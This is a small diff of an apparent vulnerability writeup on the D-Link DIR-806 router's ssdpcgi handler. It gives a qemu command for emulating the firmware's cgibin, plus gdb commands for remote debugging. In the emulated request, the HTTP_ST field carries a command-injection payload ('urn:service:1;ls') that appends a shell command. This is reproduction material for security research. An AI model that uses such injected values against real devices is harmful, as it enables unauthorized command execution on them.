@@ -6,7 +6,7 @@ http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-806
 Debugging with qemu and gdb:
 qemu: 
 `sudo chroot . ./qemu-mips-static -0 "ssdpcgi" -E REMOTE_ADDR=127.0.0.1 -E SERVER_ID=1 -E REMOTE_PORT=8888 -E HTTP_ST="urn:service:1;ls" -E REQUEST=/ -E REQUEST_METHOD=M-SEARCH -g 12345 ./htdocs/cgibin`
-gdb: 
+gdb: \\
 `set architecture mips` 
 `set endian big` 
 `target remote 127.0.0.1:12345` 
